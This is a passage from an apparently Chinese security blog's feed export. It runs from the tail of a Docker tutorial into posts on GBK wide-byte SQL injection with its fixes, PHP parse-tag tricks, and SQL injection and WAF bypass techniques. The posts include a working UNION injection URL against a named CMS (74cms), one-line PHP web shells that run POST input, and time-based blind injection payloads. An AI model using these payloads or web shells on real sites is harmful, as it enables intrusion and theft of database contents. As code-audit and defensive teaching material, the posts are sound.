nuagebec/ubuntu                   Simple always updated Ubuntu docker images...   10                   [OK]
nickistre/ubuntu-lamp             LAMP server on Ubuntu                           10                   [OK]
nickistre/ubuntu-lamp-wordpress   LAMP on Ubuntu with wp-cli installed            7                    [OK]
nimmis/ubuntu                     This is a docker images different LTS vers...   5                    [OK]
</code></pre><h4 id="拉取镜像（需要下载到本地"><a href="#拉取镜像（需要下载到本地" class="headerlink" title="拉取镜像（需要下载到本地)"></a>拉取镜像（需要下载到本地)</h4><p>  $docker pull [options] name [:tag]<br>   -a,–all-tags=false<br>  ubuntu@ubuntu:~$ docker pull ubuntu:14.04</p>
<p>   14.04: Pulling from ubuntu<br>  e7176b79954f: Pull complete<br>  e359a53f3a8b: Pull complete<br>  4655efdd3550: Already exists<br>  4d0b81bdf94e: Already exists<br>  82b16b694f1b: Already exists<br>  879409173f70: Already exists<br>  Digest: sha256:bae6d9e8c91f31a11d324495efb3859fce873de1e9db990a62d16e4f263f5a2e<br>  Status: Downloaded newer image for ubuntu:14.04</p>
</li>
</ul>
<h4 id="拉取镜像-加速访问）"><a href="#拉取镜像-加速访问）" class="headerlink" title="拉取镜像(加速访问）"></a>拉取镜像(加速访问）</h4><pre><code>使用--registry-mirror 选项
 1.修改 ： /etc/default/docker
 2.添加：DOCKER_OPTS = &quot;--registry-mirror=http://MIRROR-ADDR&quot;
</code></pre><h4 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h4><pre><code>$docker push NAME:[:TAG]
</code></pre><h3 id="构建docker镜像"><a href="#构建docker镜像" class="headerlink" title="构建docker镜像"></a>构建docker镜像</h3><ul>
<li>1.保存对容器的修改，并再次使用；</li>
<li>2.自定义镜像的能力;</li>
<li><p>3.以软件的形式打包并分发服务及其运行环境</p>
<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><p>  $docker commit  通过容器构建<br>  $docker commit [OPTION] CONTAINEG [REPOSITORY[:TAG]]</p>
<pre><code>-a,--author=&quot;&quot;  作者
-m,--message=&quot;&quot; Commit message  构建信息
-p,--pause=true Pause container during commit  指示不暂停正在运行的容器
</code></pre><p>  ubuntu@ubuntu:~$ docker commit -a “jdrops520” -m ‘nginx’ web jdrops520/commit_web1</p>
<p>  bc4ef9f3e881bd1034dc2dbca62f053044f5ac77696d3bc67e69e749fa1331e7<br>  ubuntu@ubuntu:~$<br>  ubuntu@ubuntu:~$ docker images<br>  REPOSITORY              TAG                 IMAGE ID            CREATED              VIRTUAL SIZE<br>  jdrops520/commit_web1   latest              bc4ef9f3e881        37 seconds ago       275.8 MB<br>  <none>                  <none>              7a32cf0408fa        3 weeks ago          160.5 MB<br>  ubuntu                  latest              56465e1e45d2        4 weeks ago          127.2 MB<br>  ubuntu                  14.04               e359a53f3a8b        4 weeks ago          187.9 MB<br>  <none>                  <none>              04b555fcaf13        9 weeks ago          341.8 MB<br>  <none>                  <none>              07a3e6032afb        3 months ago         188 MB<br>  hello-world             latest              f0cb9bdcaa69        4 months ago         1.848 kB<br>  ubuntu                  12.10               c5881f11ded9        2.406760 years ago   172.1 MB<br>  ubuntu@ubuntu:~$ docker run -d –name nginx_web1 jdrops520/commit_web1 nginx -g “daemon off;”<br>  35423f6554dc8cddc95dd88f924e9ab091ae330094e9aa7ba159c1d11e68019a<br>  ubuntu@ubuntu:~$ docker ps<br>  CONTAINER ID        IMAGE                          COMMAND                CREATED             STATUS              PORTS                   NAMES<br>  35423f6554dc        jdrops520/commit_web1:latest   “nginx -g ‘daemon of   17 seconds ago      Up 16 seconds       80/tcp                  nginx_web1<br>  3fdfe785153a        ubuntu:latest                  “/bin/bash”            3 hours ago         Up 2 hours          0.0.0.0:32769-&gt;80/tcp   web<br>  ubuntu@ubuntu:~$ curl <a href="http://127.0.0.1:32769" target="_blank" rel="external">http://127.0.0.1:32769</a><br>  <html><br>  <head></head></html></none></none></none></none></none></none></p>
<pre><code>&lt;title&gt;Nginx in Docker&lt;/title&gt;
</code></pre><p>  <br>  <body></body></p>
<pre><code>&lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
</code></pre><p>  <br>  <br>使用Dockerfile创建镜像<br>创建第一个Dockerfile       </p>
<p>  $docker build   通过Dockerfile文件构建<br>  $docker build [OPTIONS]PATH |URL|-</p>
<pre><code>--force-rm=false
--no-cache=false
--pull=false
-q,--quiet=false
--rm=ture
-t,--tag=&quot;&quot; 指定构建出的镜像的名字
</code></pre></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Docker简介&quot;&gt;&lt;a href=&quot;#Docker简介&quot; class=&quot;headerlink&quot; title=&quot;Docker简介&quot;&gt;&lt;/a&gt;Docker简介&lt;/h3&gt;&lt;p&gt;什么是容器？&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;一种虚拟化的方案
操作系统级别的虚拟化
只能运行相同或相似内核的操作系统
依赖于Linux内核特性:Namespace和Cgroup(Control Group)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://yotuku.cn/link?url=EyDp5bTlM&amp;amp;tk_plan=free&amp;amp;tk_storage=tietuku&amp;amp;tk_vuid=2176a6e5-d922-47e9-80d7-c5a752db4ad7&amp;amp;tk_time=2016111015&quot; alt=&quot;&quot;&gt;&lt;br&gt;什么是Docker?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;将应用程序自动部署到容器的开源引擎
Go语言开源引擎  Github地址： [](https://github.com/docker/docker)
基于Apache 2.0开源授权协议发行
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>全局防护Bypass之宽字节注入</title>
    <link href="http://yoursite.com/2016/10/29/%E5%85%A8%E5%B1%80%E9%98%B2%E6%8A%A4Bypass%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2016/10/29/全局防护Bypass之宽字节注入/</id>
    <published>2016-10-29T05:08:55.000Z</published>
    <updated>2016-10-29T12:57:22.363Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-了解宽字节的背景"><a href="#1-了解宽字节的背景" class="headerlink" title="1 了解宽字节的背景"></a>1 了解宽字节的背景</h3><p>宽字节注入的源于程序员设置MySQL连接时的错误配置为：</p>
<pre><code>set character_set_client=gbk
</code></pre><p>,这样的配置会引发代码转换从而导致注入漏洞。具体分析一下原理：</p>
<p>1.正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为\’;</p>
<a id="more"></a>
<p>2.若存在宽字节注入，输入%df%27时，经过单引号的转义变成了%df%5c%27，之后再数据库查询语句进行GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成汉字”運”,单引号逃逸出来，从而造成了注入漏洞。</p>
<p>现在基本都会讲mysql的连接配置设置为</p>
<pre><code>[set character_set_client=binary]
</code></pre><p>来解决这个问题，这篇博客将介绍php中因为编码或字符编码转换导致的注入问题。</p>
<h3 id="2-mysql中的宽字符注入"><a href="#2-mysql中的宽字符注入" class="headerlink" title="2 mysql中的宽字符注入"></a>2 mysql中的宽字符注入</h3><p>测试搭建学习的环境利用了phithon内容管理系统，看代码</p>
<pre><code>&lt;?php
//连接数据库部分，注意使用了gbk编码
$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;);
mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);
mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);
//执行sql语句
$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;
$sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;;
$result = mysql_query($sql, $conn) or die(mysql_error());
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;gbk&quot; /&gt;
&lt;title&gt;新闻&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;?php
$row = mysql_fetch_array($result, MYSQL_ASSOC);
echo &quot;&lt;h2&gt;{$row[&apos;title&apos;]}&lt;/h2&gt;&lt;p&gt;{$row[&apos;content&apos;]}&lt;p&gt;\n&quot;;
mysql_free_result($result);
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>SQL语句是SELECT * FROM news WHERE tid=’{$id}’，根据文章的id把文章从news表中提取出来，在$sql之前，我们只用了限制函数addslashes函数，对$id进行转义，只要我们输入参数在单引号中，就逃逸不出单引号的限制，从而无法注入。</p>
<p>我们这里利用的是mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字节是一个汉字（前一个ascii码要大于128，才到汉字范围），我们测试输入%df’<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029141036.png" alt=""><br>已经报错，看到报错，说明sql语句出错，看到出错说明可以注入。报错的原因就是多了一个单引号，而单引号前面的反斜杠不见啦。这就是mysql的特性，因为gbk是多字节编码，它人为两个字代表一个字节，所以%df和后面的%5c变成了汉字“運”，而’逃逸了出来。</p>
<p>因为是两个字节代表一个汉字，我们尝试%df%df%27:<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029142058.png" alt=""><br>不报错了，因为%df%df组成了汉字”哌”,%5c%27不是汉字，仍然是\’</p>
<p>mysql如何判断一个字符是不是一个汉字，根据gbk编码，第一个字节的ascii码大于128，基本上就行，若不用%df二用%a1也可以<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029143324.png" alt=""><br>%a1%5c虽然不是一个汉字，但一定会被mysql认为是一个宽字符，所以就能让后面的%27逃逸出来，构造一个exp，查询管理人员的账号密码。<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029144420.png" alt=""></p>
<p>####GB12和GBK的区别<br>gb2312和gbk都是宽字节家族医院，但是当把数据库编码设置为关闭gb2312时，结果就不能注入</p>
<pre><code>&lt;?php
//连接数据库部分，注意使用了gbk编码
$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;);
mysql_query(&quot;SET NAMES &apos;gb2312&apos;&quot;);
mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);
//执行sql语句
$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;
$sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;;
$result = mysql_query($sql, $conn) or die(mysql_error());
?&gt;
</code></pre><p>这主要是gb2312编码取值范围的事情，它高位范围0xA1~0xF7，低位范围是0xA1~0xFE，\是%5c，是不在低范围中的，即其根本不是gb2312遍吗，故其不会被吃掉。故只要低位的范围中含有0x5c的编码，就可以进行宽字节的注入</p>
<h3 id="3-利用mysql-real-escape-string解决问题"><a href="#3-利用mysql-real-escape-string解决问题" class="headerlink" title="3 利用mysql_real_escape_string解决问题"></a>3 利用mysql_real_escape_string解决问题</h3><p>一些cms把addslashes替换为mysql_real_escape_string来防止宽字节的注入<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029150935.png" alt=""><br>我们若解决需要做的指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下<code>mysql_set_charset</code>函数，设置当前的字符集为gbk,来避免问题<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数库"</span>);</div><div class="line"><span class="comment">//执行sql语句</span></div><div class="line">mysql_set_charset(<span class="string">'gbk'</span>,$conn)</div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? mysql_real_escape_string($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="4-宽字节注入修复"><a href="#4-宽字节注入修复" class="headerlink" title="4 宽字节注入修复"></a>4 宽字节注入修复</h3><p><code>character_set_client=&#39;binary&#39;</code>设置为binary（二进制）,只需要在所有的sql语句前指定一下连接的形式为二进制：<br><code>mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn);</code>,当我们的mysql接受到客户端的数据后，会认为他的编码是<code>character_set_client</code>，然后会将换成<code>character_set_connection</code>的编码，然后在进入具体表和字段后，再转换成字段对应的编码，然后当查询结果产生后，会从表和字段编码，转换成<code>character_set_results</code>编码，返回给客户端。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码</span></div><div class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</div><div class="line"><span class="comment">//执行sql语句</span></div><div class="line">mysql_query(<span class="string">"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary"</span>, $conn); </div><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div><div class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这个方法避免宽字节的注入还是有效的，但是如果开发者画蛇添足的增加一些东西，会让前期的努力前功尽弃。</p>
<h3 id="5-iconv造成的严重后果"><a href="#5-iconv造成的严重后果" class="headerlink" title="5 iconv造成的严重后果"></a>5 iconv造成的严重后果</h3><p>很多cms会将接收到的数据，调用这样一个函数，转换其编码：<br><code>iconv(&#39;utf-8&#39;,&#39;gbk&#39;,$_GET[&#39;id&#39;])；</code>，目的一般是避免乱码，特别是搜索框的位置</p>
<pre><code>&lt;?php
//连接数据库部分，注意使用了gbk编码
$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;bad!&apos;);
mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);
mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);
//执行sql语句
mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); 
$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;
$id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id);
$sql = &quot;SELECT * FROM news WHERE tid=&apos;{$id}&apos;&quot;;
$result = mysql_query($sql, $conn) or die(mysql_error());
?&gt;
</code></pre><p>可以发现，在sql语句执行前，将<code>character_set_client</code>设置成了binary，所以避免宽字节的注入问题。但之后其调用了iconv将已经过滤的参数$id给转换了一下，测试一下<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029163501.png" alt=""><br>报错说明我们錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。利用的是将\转移掉。</p>
<p>利用iconv将gbk转换成utf-8，则可以直接用宽字节注入的姿势来。gbk汉字2字节，utf-8汉字是3字节，若把gbk转换成utf-8,则php会每两个字节一转换。所以，如果\’前面的字符是奇数的话，势必会吞掉\，’逃出限制。</p>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h3><p>1.gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary。</p>
<p>2.矫正人们对于mysql_real_escape_string的误解，单独调用set name=gbk和mysql_real_escape_string是无法避免宽字符注入问题的。还得调用mysql_set_charset来设置一下字符集。</p>
<p>3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设置成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。</p>
<h3 id="7-代码审计实战"><a href="#7-代码审计实战" class="headerlink" title="7 代码审计实战"></a>7 代码审计实战</h3><p>对骑士cms审计时发现在plus/ajax_street.php</p>
<pre><code>elseif($act == &apos;key&apos;)
{
    $key=trim($_GET[&apos;key&apos;]);
    if (!empty($key))
    {
    if (strcasecmp(QISHI_DBCHARSET,&quot;utf8&quot;)!=0) 
    //对参数key进行utf-8到GBK编码的转换
    $key=iconv(&quot;utf-8&quot;,QISHI_DBCHARSET,$key);
    //带入查询，可注入
    //table($table = &apos;category&apos;)=&gt;&apos;qs_74cmscategory&apos;
    $result = $db-&gt;query(&quot;select * from &quot;.table(&apos;category&apos;).&quot; where c_alias=&apos;QS_street&apos; AND c_name LIKE &apos;%{$key}%&apos; &quot;);
    //将查询结果输出到页面，可回显
    while($row = $db-&gt;fetch_array($result))
    {
        if ($listtype==&quot;li&quot;)
        {
        $htm.=&quot;&lt;li  title=\&quot;{$row[&apos;c_name&apos;]}\&quot; id=\&quot;{$row[&apos;c_id&apos;]}\&quot;&gt;{$row[&apos;c_name&apos;]}&lt;/li&gt;&quot;;
        }
        else
        {
        $_GET[&apos;streetid&apos;]=$row[&apos;c_id&apos;];
        $url=url_rewrite(&apos;QS_street&apos;,$_GET);
        $htm.=&quot;&lt;li&gt;&lt;a href=\&quot;{$url}\&quot; title=\&quot;{$row[&apos;c_note&apos;]}\&quot; class=\&quot;vtip\&quot;&gt;{$row[&apos;c_name&apos;]}&lt;/a&gt;&lt;span&gt;{$row[&apos;stat_jobs&apos;]}&lt;/span&gt;&lt;/li&gt;&quot;;
        };
    }
    if (empty($htm))
        {
        $htm=&quot;&lt;span class=\&quot;noinfo\&quot;&gt;没有找到关键字： &lt;span&gt;{$key}&lt;/span&gt; 相关道路！&lt;/span&gt;&quot;;
        }
        exit($htm);
        }
    }
</code></pre><p>在之前配置文件设置的是<code>mysql_query(&quot;SET character_set_connection=&quot; . $dbcharset . &quot;, character_set_results=&quot; . $dbcharset . &quot;, character_set_client=binary&quot;, $this-&gt;linkid);</code>,其中利用了iconv函数造成致命的错误，同时分析发现页面将查询结果回显回来，构造一些union的查询语句即可获取数据库的敏感信息</p>
<h4 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h4><p>测试有几个字段,发现category表一共有9个字段，所以可以构造获取数据库用户和先关信息的exp<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029201535.png" alt=""><br>然后利用union的查询语句爆出可利用的列为4,8,exp：<br><a href="http://localhost/74cms/upload/plus/ajax_street.php?act=key&amp;key=-%e9%8c%a6&#39; union select 1,2,3,4,5,6,7,8,9-- -" target="_blank" rel="external"></a>,然后是爆出数据库和用户名等相关信息<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161029202453.png" alt=""></p>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>GBK编码中的两个字符是一个汉字，第一个字符需要大于128</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-了解宽字节的背景&quot;&gt;&lt;a href=&quot;#1-了解宽字节的背景&quot; class=&quot;headerlink&quot; title=&quot;1 了解宽字节的背景&quot;&gt;&lt;/a&gt;1 了解宽字节的背景&lt;/h3&gt;&lt;p&gt;宽字节注入的源于程序员设置MySQL连接时的错误配置为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set character_set_client=gbk
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;,这样的配置会引发代码转换从而导致注入漏洞。具体分析一下原理：&lt;/p&gt;
&lt;p&gt;1.正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为\’;&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计 PHP" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码解析标签</title>
    <link href="http://yoursite.com/2016/10/28/PHP%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90%E6%A0%87%E7%AD%BE/"/>
    <id>http://yoursite.com/2016/10/28/PHP代码解析标签/</id>
    <published>2016-10-28T12:12:36.000Z</published>
    <updated>2016-10-29T13:01:40.083Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h3><p>PHP有几种解析标签的写法来标识php代码，其中最标准的&lt;?php ?&gt;,当php解析器找到这个标签时，就会执行标签内部的代码，但在实际的应用时，尤其在上传对内容过滤了&lt;?和php，在这里重点介绍一下</p>
<a id="more"></a>
<h3 id="2-PHP代码解析标签"><a href="#2-PHP代码解析标签" class="headerlink" title="2 PHP代码解析标签"></a>2 PHP代码解析标签</h3><h4 id="A-脚本标签"><a href="#A-脚本标签" class="headerlink" title="A 脚本标签"></a>A 脚本标签</h4><pre><code>形式：&lt;script language=&quot;PHP&quot;&gt;...&lt;/script&gt;,这种写法有点像JavaScript,不过也可以正常解析PHP代码
</code></pre><p>举例：</p>
<pre><code>&lt;script language=”PHP”&gt;include_once(“$_POST[J_drOps]”);&lt;/script&gt;
</code></pre><p>这样的话对于绕过过滤了&lt;?和php的问题，屡试不爽<br>还有一个常用的样式，就是利用反引号执行命令（``）</p>
<pre><code>&lt;script language=&quot;PHP&quot;&gt;echo `$_POST[id]` ;&lt;/script&gt;
</code></pre><p>实际上反引号（``）执行的命令是调用了shell_exec()函数，我们来看具体的测试<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161028203135.png" alt=""></p>
<h4 id="B-短标签"><a href="#B-短标签" class="headerlink" title="B 短标签"></a>B 短标签</h4><p>&lt;?….?&gt;，使用短标签前需要设置php.ini中设置short_open_tage=on,默认是on状态。</p>
<h4 id="C-asp标签"><a href="#C-asp标签" class="headerlink" title="C asp标签"></a>C asp标签</h4><p>&lt;%…%&gt;，在PHP3.0.4版本后可用，需要在php.ini中设置asp_tags=on,默认是off</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1 前言&quot;&gt;&lt;/a&gt;1 前言&lt;/h3&gt;&lt;p&gt;PHP有几种解析标签的写法来标识php代码，其中最标准的&amp;lt;?php ?&amp;gt;,当php解析器找到这个标签时，就会执行标签内部的代码，但在实际的应用时，尤其在上传对内容过滤了&amp;lt;?和php，在这里重点介绍一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>sql注入绕过技巧</title>
    <link href="http://yoursite.com/2016/10/25/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2016/10/25/sql注入绕过技巧/</id>
    <published>2016-10-25T13:39:52.000Z</published>
    <updated>2016-11-01T13:14:57.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h3><p>SQL注入绕过的技巧要看具体的环境，可以自己搭建测试，最好是在渗透测试的过程中遇到的环境，否则若仅靠自己凭空想，显然是不靠谱的。这篇文章我会总结一些之前遇到的绕过奇淫技巧，随着自己的见识和能力增强，相信自己总结的方法也会增多。</p>
<a id="more"></a>
<h3 id="2-比较符（-lt-gt-绕过"><a href="#2-比较符（-lt-gt-绕过" class="headerlink" title="2 比较符（&lt;,&gt;)绕过"></a>2 比较符（&lt;,&gt;)绕过</h3><p>在测试盲注时，使用二分查找的时候需要使用到比较操作符来进行查找，若无法使用比较操作符可以使用到greatest来进行绕过。常见的盲注语句如下：</p>
<pre><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;72
</code></pre><p>若比较操作符被过滤掉，其盲注语句即无法正常使用，则可以使用greatest来代替比较操作符greatest（n1,n2,n3,等）函数返回输入参数（n1,n2,n3,等）的最大值。</p>
<p>我们可以利用greatest进行上面盲注测试：</p>
<pre><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)=72
</code></pre><ul>
<li><p>总结：利用greatest()函数绕过比较操作符</p>
<h3 id="3-引号绕过"><a href="#3-引号绕过" class="headerlink" title="3 引号绕过"></a>3 引号绕过</h3><p>在进行sql语句测试时在限定的where子句中会使用到引号””,看具体的代码：</p>
<p>  select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”</p>
</li>
</ul>
<p>如果引号被过滤掉，那么上面的where语句则无法使用，遇到这样的问题我们可以使用十六进制来处理这个问题，users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
<pre><code>select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273
</code></pre><p>-总结：使用十六进制可以绕过引号</p>
<h3 id="4-逗号的绕过"><a href="#4-逗号的绕过" class="headerlink" title="4 逗号的绕过"></a>4 逗号的绕过</h3><p>在测试盲注的的时候，会利用到substr(),mid(),limit(),这些子句的方法都需要使用到逗号，对于substr()和mid(）这两个方法可以使用from for 的方法来解决</p>
<pre><code>select substr(database(0 from 1 for 1);
select mid(database(0 from 1 for 1);
</code></pre><p>对于limit可以使用offset来绕过</p>
<pre><code>select * form news limit 0,1;
#等价下面的sql语句
select * from news limit 1 offset 0;
</code></pre><ul>
<li><p>总结：使用from绕过逗号</p>
<h3 id="5-注释，括号，-a0绕过空格"><a href="#5-注释，括号，-a0绕过空格" class="headerlink" title="5 注释，括号，%a0绕过空格"></a>5 注释，括号，%a0绕过空格</h3><p>sql注入时，空格的使用是非常普遍的，比如利用union来获得目标的数据</p>
<p>  and 0 union select null,null,null<br>  #上面语句中，and两侧，union两侧，select两侧都需要空格<br>####注释绕过空格</p>
</li>
<li><p>/<em>注释</em>/</p>
<p>  select user() from info;<br>  #########利用注释替换空格，就可以变成<br>  select/<strong>/user()/</strong>/from/**/info<br>或者：</p>
</li>
</ul>
<p><code>/**/un/**/io/**/n/**/sel/**/ec/**/t/**/1,2,3,4,5,5 from admin</code></p>
<p>第二种注释：<br><code>/*!and*/ 1=2</code></p>
<p>####括号绕过空格<br>在mysql中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端可以没有多余的空格。括号绕过空格的方法，在基于时间的盲注时，是屡试不爽</p>
<pre><code>select user() from info where 1=1 and 2=2
</code></pre><p>如何把括号减到最少？，观察user()可以算值，故user()两边要加括号，变成：<br>    select(user())from info where 1=1 and 2=2;<br>继续，1=1和2=2可以算值，也加括号，去空格，变成：</p>
<pre><code>select(user())from info where(1=1)and(2=2);
</code></pre><p>info两边的空格，通常是由程序员自己添加，我们一般无法控制，所以上面就是空格最少的的结果</p>
<p>在以一条time base盲注语句做一个总结：</p>
<pre><code>?id=(sleep(ascii(mid(user()from(2)for(1)))=109))
</code></pre><h3 id="6-绕waf测试套路"><a href="#6-绕waf测试套路" class="headerlink" title="6 绕waf测试套路"></a>6 绕waf测试套路</h3><p>尤其在做CTF比赛时，存在waf最令人头疼，语句的正常注射也是尤为关键，我们这时候可以尝试特殊字符的情况，特殊字符有</p>
<ul>
<li>!@#$%^&amp;*()_-+&lt;&gt;?/|~</li>
</ul>
<p>若在测试的时候某一个字符被替换为空，我们可以得出结论，此字符可以被正常的接受，然后就是用这个字符和语句结合来绕过waf</p>
<h3 id="7-绕过waf-360等防注入软件"><a href="#7-绕过waf-360等防注入软件" class="headerlink" title="7 绕过waf 360等防注入软件"></a>7 绕过waf 360等防注入软件</h3><h4 id="A-大小写变种"><a href="#A-大小写变种" class="headerlink" title="A 大小写变种"></a>A 大小写变种</h4><p>使用起来最简单，效果现在来说不是太显著，比如：and 1=2 AnD 1=3；</p>
